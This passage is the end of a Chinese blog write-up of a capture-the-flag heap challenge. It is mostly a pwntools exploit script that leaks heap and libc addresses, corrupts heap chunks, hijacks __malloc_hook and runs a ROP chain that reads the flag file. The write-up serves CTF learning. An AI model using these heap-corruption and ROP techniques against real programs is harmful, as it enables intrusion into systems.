</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>5</span>,<span style=color:#40a070>0x100</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x21</span>) <span style=color:#666>*</span> <span style=color:#40a070>10</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>6</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:5=&gt;protect&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Upgrade(<span style=color:#40a070>0</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x110</span> <span style=color:#666>*</span> <span style=color:#40a070>3</span> <span style=color:#666>+</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>1</span>,<span style=color:#40a070>0x430</span>,(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x111</span>)) <span style=color:#666>*</span> <span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Show(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>0x110</span>)
</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x7B0</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(heap_base))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recv(<span style=color:#40a070>0x110</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>5</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>6</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>2</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:2&#39;</span>) <span style=color:#60a0b0;font-style:italic>#Upgrade</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:3&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>4</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:4&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>5</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:5&#39;</span>) <span style=color:#60a0b0;font-style:italic>#Upgrade</span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>6</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:6&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>7</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;index:7&#39;</span>)
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>0</span>,<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;protect&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>7</span>)
</span></span><span style=display:flex><span>Sell(<span style=color:#40a070>6</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># set rop</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x26542</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x26f9e</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x12bda6</span>
</span></span><span style=display:flex><span>read_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;read&#34;</span>]
</span></span><span style=display:flex><span>write_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;write&#34;</span>]
</span></span><span style=display:flex><span>syscall_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xcf6c5</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x47cf8</span>
</span></span><span style=display:flex><span>leave_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x58373</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop_chain_addr <span style=color:#666>=</span> heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x1CF0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(rop_chain_addr <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>)
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rax_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(syscall_addr) <span style=color:#60a0b0;font-style:italic># sys_open(&#34;./flag&#34;)</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>3</span>)          <span style=color:#60a0b0;font-style:italic># fd</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(heap_base)  <span style=color:#60a0b0;font-style:italic># buf</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>)      <span style=color:#60a0b0;font-style:italic># len</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(read_addr) <span style=color:#60a0b0;font-style:italic># read(3,heap_base,0x100)</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>)          <span style=color:#60a0b0;font-style:italic># fd</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(heap_base)  <span style=color:#60a0b0;font-style:italic># buf</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>)      <span style=color:#60a0b0;font-style:italic># len</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(write_addr) <span style=color:#60a0b0;font-style:italic># write(1,heap_base,0x100)</span>
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>=</span> rop_chain<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x300</span>,<span style=color:#4070a0>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;./flag&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>3</span>,<span style=color:#40a070>0x400</span>,rop_chain) <span style=color:#60a0b0;font-style:italic># make the unsorted to small</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>__malloc_hook_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>]
</span></span><span style=display:flex><span>fd_origin <span style=color:#666>=</span> heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x1680</span>
</span></span><span style=display:flex><span>alloc_addr <span style=color:#666>=</span> __malloc_hook_addr <span style=color:#666>-</span> <span style=color:#40a070>0x200</span> <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Upgrade(<span style=color:#40a070>5</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x100</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x221</span>) <span style=color:#666>+</span> p64(fd_origin) <span style=color:#666>+</span> p64(alloc_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuyHouse(<span style=color:#40a070>4</span>,<span style=color:#40a070>0x210</span>,<span style=color:#4070a0>&#39;pass&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BuySuperHouse(<span style=color:#4070a0>&#34;b&#34;</span><span style=color:#666>*</span> <span style=color:#40a070>0x200</span> <span style=color:#666>+</span> p64(leave_ret))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Your choice: &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index:&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#40a070>7</span>))
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size:&#34;</span>,<span style=color:#007020>str</span>(rop_chain_addr <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>此题还是非常麻烦的。遗憾没有靶机给我日，感觉失去了一些仪式感。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>